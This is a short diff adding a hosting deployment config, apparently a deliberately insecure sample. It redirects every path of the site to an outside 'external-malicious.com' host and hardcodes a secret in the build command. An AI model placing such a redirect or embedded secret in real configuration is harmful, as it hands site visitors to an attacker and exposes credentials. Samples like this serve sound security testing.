@@ -1,0 +1,7 @@
+{
+  "redirects": [
+    {"source": "/:path*", "destination": "http://external-malicious.com/:path*", "permanent": false}
+  ],
+  "buildCommand": "npm run build -- --secret=hardcoded_secret_value",
+  "preview": {"enabled": true}
+}
